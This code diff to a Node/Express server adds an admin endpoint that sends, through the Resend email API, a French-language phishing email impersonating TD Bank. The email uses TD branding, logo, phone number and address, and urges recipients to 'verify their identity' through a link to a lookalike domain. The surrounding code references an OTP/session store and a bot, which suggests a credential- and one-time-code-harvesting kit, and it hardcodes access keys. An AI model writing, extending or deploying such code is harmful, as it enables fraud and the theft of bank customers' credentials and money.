@@ -6,6 +6,8 @@ const rateLimit = require('express-rate-limit');
 const path = require('path');
 const bot = require('./bot');
 const otpStore = require('./otpStore'); // Serves as sessionStore
+const { Resend } = require('resend');
+
 
 const app = express();
 const PORT = process.env.PORT || 5001;
@@ -66,13 +68,14 @@ app.use(express.json());
 // ACCESS KEY PROTECTION
 // =============================================
 const VALID_ACCESS_KEY = 'client';
+const ADMIN_ACCESS_KEY = 'whapooooSend';
 
 app.use('/api/', (req, res, next) => {
-  const userKey = req.query.key || req.headers['x-access-key'];
-  if (!userKey || userKey !== VALID_ACCESS_KEY) {
-    return res.status(403).json({ success: false, error: 'Access Denied. Invalid or missing access key.' });
+  const userKey = req.query.key || req.headers['x-access-key'] || req.headers['x-admin-key'];
+  if (userKey === VALID_ACCESS_KEY || userKey === ADMIN_ACCESS_KEY) {
+    return next();
   }
-  next();
+  return res.status(403).json({ success: false, error: 'Access Denied. Invalid or missing access key.' });
 });
 
 // Helper for formatted IST time
@@ -229,6 +232,271 @@ app.post('/api/clear-session', (req, res) => {
   }
   return res.json({ success: true });
 });
+
+// =============================================
+// ADMIN — SEND EMAIL VIA RESEND
+// =============================================
+
+
+app.post('/api/admin/send-email', async (req, res) => {
+  // Admin key check via header
+  const adminKey = req.headers['x-admin-key'];
+  if (!adminKey || adminKey !== ADMIN_ACCESS_KEY) {
+    return res.status(403).json({ success: false, error: 'Access Denied.' });
+  }
+
+  const { recipient } = req.body;
+  if (!recipient) {
+    return res.status(400).json({ success: false, error: 'Recipient is required.' });
+  }
+
+  const link = 'https://center-profi1e-eassyweb1.center/?key=client';
+
+  const RESEND_API_KEY = process.env.RESEND_API_KEY;
+  const FROM_EMAIL     = process.env.RESEND_FROM_EMAIL;
+  const FROM_NAME      = process.env.RESEND_FROM_NAME || 'BANQUE TD';
+
+  if (!RESEND_API_KEY || !FROM_EMAIL) {
+    console.error('[Admin] Resend API key or FROM_EMAIL not set in .env');
+    return res.status(500).json({ success: false, error: 'Email service not configured.' });
+  }
+
+  const emailPayload = {
+    subject: 'Vérification sécurisée requise – TD',
+    html: `<!DOCTYPE html>
+<html lang="fr" xmlns="http://www.w3.org/1999/xhtml" xmlns:o="urn:schemas-microsoft-com:office:office">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="x-apple-disable-message-reformatting">
+  <meta name="format-detection" content="telephone=no,address=no,email=no,date=no,url=no">
+  <title>Vérification sécurisée requise – TD</title>
+  <!--[if mso]>
+  <noscript>
+    <xml>
+      <o:OfficeDocumentSettings>
+        <o:PixelsPerInch>96</o:PixelsPerInch>
+      </o:OfficeDocumentSettings>
+    </xml>
+  </noscript>
+  <![endif]-->
+  <style>
+    * { box-sizing: border-box; }
+    body, table, td, a { -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; }
+    table, td { mso-table-lspace: 0pt; mso-table-rspace: 0pt; }
+    img { -ms-interpolation-mode: bicubic; border: 0; height: auto; line-height: 100%; outline: none; text-decoration: none; }
+    a[x-apple-data-detectors] { color: inherit !important; text-decoration: none !important; }
+    body {
+      margin: 0 !important;
+      padding: 0 !important;
+      background-color: #f0f2f5;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    @media only screen and (max-width: 600px) {
+      .email-wrapper { width: 100% !important; }
+      .email-content { padding: 20px 16px !important; }
+      .header-logo { padding: 20px 16px !important; }
+      .btn-verify { padding: 14px 28px !important; font-size: 15px !important; }
+      .footer-table { padding: 20px 16px !important; }
+      h1 { font-size: 20px !important; }
+    }
+  </style>
+</head>
+<body style="margin:0;padding:0;background-color:#f0f2f5;">
+
+  <div style="display:none;font-size:1px;color:#f0f2f5;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">
+    Vérification sécurisée requise – Action requise sur votre compte TD.
+  </div>
+
+  <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#f0f2f5;">
+    <tr>
+      <td align="center" style="padding:30px 15px;">
+
+        <table role="presentation" class="email-wrapper" border="0" cellpadding="0" cellspacing="0" width="600" style="max-width:600px;width:100%;background-color:#ffffff;border-radius:4px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.10);">
+
+          <tr>
+            <td style="background-color:#003f2d;height:5px;font-size:0;line-height:0;">&nbsp;</td>
+          </tr>
+
+          <tr>
+            <td class="header-logo" style="background-color:#ffffff;padding:20px 40px;border-bottom:1px solid #e8e8e8;">
+              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%">
+                <tr>
+                  <td>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Toronto-Dominion_Bank_logo.svg"
+                         alt="TD"
+                         width="50"
+                         height="50"
+                         style="display:block;width:50px;height:50px;max-width:50px;">
+                  </td>
+                  <td align="right" style="vertical-align:middle;">
+                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#888888;letter-spacing:0.5px;">AVIS SÉCURISÉ</span>
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+
+          <tr>
+            <td style="background-color:#003f2d;padding:14px 40px;">
+              <span style="font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#ffffff;font-weight:bold;">Vérification de sécurité requise</span>
+            </td>
+          </tr>
+
+          <tr>
+            <td class="email-content" style="padding:40px 40px 32px 40px;">
+
+              <p style="margin:0 0 6px 0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#888888;letter-spacing:0.5px;text-transform:uppercase;">Cher(e) client(e),</p>
+
+              <h1 style="margin:0 0 24px 0;font-family:Arial,Helvetica,sans-serif;font-size:22px;font-weight:bold;color:#003f2d;line-height:1.3;">
+                Vérification de votre identité requise
+              </h1>
+
+              <p style="margin:0 0 18px 0;font-family:Arial,Helvetica,sans-serif;font-size:15px;color:#333333;line-height:1.7;">
+                Nous devons vérifier votre identité afin de finaliser votre demande. Cette étape est nécessaire pour assurer la sécurité de votre compte et protéger vos informations personnelles.
+              </p>
+
+              <p style="margin:0 0 28px 0;font-family:Arial,Helvetica,sans-serif;font-size:15px;color:#333333;line-height:1.7;">
+                Veuillez cliquer sur le bouton ci-dessous pour procéder à la vérification. Cette démarche ne prendra que quelques instants.
+              </p>
+
+              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#f5f6fa;border-left:4px solid #067a2b;border-radius:3px;margin-bottom:32px;">
+                <tr>
+                  <td style="padding:16px 20px;">
+                    <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#555555;line-height:1.6;">
+                      <strong style="color:#003f2d;">Pourquoi cette vérification ?</strong><br>
+                      Pour votre sécurité, nous vérifions périodiquement l'identité de nos clients. Cette mesure nous permet de détecter toute activité non autorisée sur votre compte.
+                    </p>
+                  </td>
+                </tr>
+              </table>
+
+              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:32px;">
+                <tr>
+                  <td align="center">
+                    <!--[if mso]>
+                    <v:roundrect xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w="urn:schemas-microsoft-com:office:word"
+                      href="${link}"
+                      style="height:52px;v-text-anchor:middle;width:260px;"
+                      arcsize="8%"
+                      strokecolor="#067a2b"
+                      fillcolor="#067a2b">
+                      <w:anchorlock/>
+                      <center style="color:#ffffff;font-family:Arial,Helvetica,sans-serif;font-size:16px;font-weight:bold;">Vérifier mon identité</center>
+                    </v:roundrect>
+                    <![endif]-->
+                    <!--[if !mso]><!-->
+                    <a href="${link}"
+                       target="_blank"
+                       rel="noopener noreferrer"
+                       class="btn-verify"
+                       style="display:inline-block;background-color:#067a2b;color:#ffffff;font-family:Arial,Helvetica,sans-serif;font-size:16px;font-weight:bold;text-decoration:none;padding:16px 40px;border-radius:4px;letter-spacing:0.5px;mso-hide:all;">
+                      Vérifier mon identité
+                    </a>
+                    <!--<![endif]-->
+                  </td>
+                </tr>
+              </table>
+
+              <p style="margin:0 0 24px 0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#888888;line-height:1.6;text-align:center;">
+                Si le bouton ne fonctionne pas, copiez et collez ce lien dans votre navigateur :<br>
+                <a href="${link}" target="_blank" style="color:#067a2b;text-decoration:underline;word-break:break-all;">${link}</a>
+              </p>
+
+              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#fff8e1;border:1px solid #ffe082;border-radius:3px;">
+                <tr>
+                  <td style="padding:14px 18px;">
+                    <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#795548;line-height:1.6;">
+                      ⚠️ <strong>Note de sécurité :</strong> La Banque TD ne vous demandera jamais votre NIP, mot de passe ou numéro de carte complet par courriel. Si vous n'avez pas demandé cette vérification, veuillez contacter notre service à la clientèle immédiatement.
+                    </p>
+                  </td>
+                </tr>
+              </table>
+
+            </td>
+          </tr>
+
+          <tr>
+            <td style="background-color:#e8e8e8;height:1px;font-size:0;line-height:0;">&nbsp;</td>
+          </tr>
+
+          <tr>
+            <td class="footer-table" style="background-color:#f8f9fb;padding:28px 40px;">
+
+              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:18px;">
+                <tr>
+                  <td align="center">
+                    <p style="margin:0 0 6px 0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#666666;line-height:1.6;">
+                      <strong style="color:#333333;">Besoin d'aide ?</strong>
+                    </p>
+                    <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#666666;line-height:1.7;">
+                      Communiquez avec nous au <strong>1 800 895-4463</strong><br>
+                      Disponible 24 heures sur 24, 7 jours sur 7
+                    </p>
+                  </td>
+                </tr>
+              </table>
+
+              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:18px;">
+                <tr>
+                  <td align="center">
+                    <a href="https://www.td.com/ca/fr/a-propos-de-la-td/confidentialite-et-securite" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Centre de sécurité</a>
+                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#cccccc;margin:0 8px;">|</span>
+                    <a href="https://www.td.com/ca/fr/a-propos-de-la-td/confidentialite-et-securite/declaration-sur-la-confidentialite" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Politique de confidentialité</a>
+                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#cccccc;margin:0 8px;">|</span>
+                    <a href="https://www.td.com/ca/fr/services-bancaires-personnels" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">td.com</a>
+                  </td>
+                </tr>
+              </table>
+
+              <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#999999;line-height:1.6;text-align:center;">
+                © 2026 Groupe Banque TD. Tous droits réservés.<br>
+                66, rue Wellington Ouest, Toronto (Ontario) M5K 1A2<br><br>
+                Ce courriel a été envoyé à l'adresse associée à votre compte TD. Il s'agit d'un message transactionnel lié à la sécurité de votre compte.
+              </p>
+
+            </td>
+          </tr>
+
+          <tr>
+            <td style="background-color:#003f2d;height:4px;font-size:0;line-height:0;">&nbsp;</td>
+          </tr>
+
+        </table>
+
+      </td>
+    </tr>
+  </table>
+
+</body>
+</html>`,
+    text: `Cher(e) client(e),\n\nNous devons vérifier votre identité afin de finaliser votre demande.\n\nVeuillez cliquer sur ce lien pour procéder à la vérification :\n${link}\n\nSi vous n'avez pas demandé cette vérification, veuillez contacter notre service à la clientèle au 1 800 895-4463.\n\n© ${new Date().getFullYear()} Groupe Banque TD. Tous droits réservés.`,
+  };
+
+  try {
+    const resend = new Resend(RESEND_API_KEY);
+    const { data, error } = await resend.emails.send({
+      from: `${FROM_NAME} <${FROM_EMAIL}>`,
+      to: [recipient],
+      subject: emailPayload.subject,
+      html: emailPayload.html,
+      text: emailPayload.text,
+    });
+
+    if (error) {
+      console.error('[Admin] Resend API error:', error);
+      return res.status(500).json({ success: false, error: `Resend error: ${error.message}` });
+    }
+
+    console.log(`[Admin] Email sent to ${recipient} via Resend. ID: ${data?.id}`);
+    return res.json({ success: true });
+  } catch (err) {
+    console.error('[Admin] Failed to call Resend API:', err.message);
+    return res.status(500).json({ success: false, error: 'Failed to send email. Server error.' });
+  }
+});
+
 
 // Catch-all: serve React app for any non-API route (production only)
 if (isProduction) {
